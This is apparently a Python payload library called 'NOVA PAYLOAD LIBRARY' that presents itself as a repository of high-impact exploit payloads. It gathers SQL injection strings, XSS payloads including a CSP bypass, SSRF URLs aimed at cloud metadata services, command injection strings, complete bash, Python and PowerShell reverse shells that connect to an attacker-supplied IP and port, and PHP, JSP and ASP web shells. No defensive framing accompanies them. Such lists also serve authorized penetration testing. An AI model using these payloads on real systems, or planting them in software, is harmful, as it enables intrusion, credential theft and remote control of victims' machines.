#!/usr/bin/env python3
"""
🦅 NOVA PAYLOAD LIBRARY v1.0
Centralized repository for high-impact exploit payloads.
"""

PAYLOADS = {
    "sql_injection": {
        "generic": ["' OR 1=1--", "' UNION SELECT NULL, NULL--", "admin'--"],
        "mysql": ["' OR SLEEP(5)--", "' UNION SELECT @@version, user()--"],
        "postgresql": ["' OR pg_sleep(5)--", "' UNION SELECT version(), current_user--"],
        "sqlite": ["' UNION SELECT sqlite_version(), NULL--"]
    },
    "xss": {
        "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "csp_bypass": ["<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js'></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>"],
        "svg": ["<svg/onload=alert(1)>"]
    },
    "ssrf": {
        "aws": ["http://169.254.169.254/latest/meta-data/", "http://instance-data/latest/meta-data/"],
        "gcp": ["http://metadata.google.internal/computeMetadata/v1/"],
        "azure": ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
        "local": ["http://localhost:80", "http://127.0.0.1:8080"]
    },
    "rce": {
        "linux": ["; id", "`id`", "$(id)", "| id"],
        "windows": ["& whoami", "| whoami", "$(whoami)"]
    },
    "reverse_shells": {
        "bash": ["bash -i >& /dev/tcp/{ip}/{port} 0>&1"],
        "python": ["python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"],
        "powershell": ["powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.length);$s.Flush()};$c.Close()"]
    },
    "web_shells": {
        "php": ["<?php system($_GET['cmd']); ?>"],
        "jsp": ["<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); %>"],
        "asp": ["<% eval request(\"cmd\") %>"]
    }
}

def get_payloads(category, subcategory=None):
    cat = PAYLOADS.get(category, {})
    if subcategory:
        return cat.get(subcategory, [])
    # Return all subcategories if none specified
    all_payloads = []
    for sub in cat.values():
        all_payloads.extend(sub)
    return all_payloads
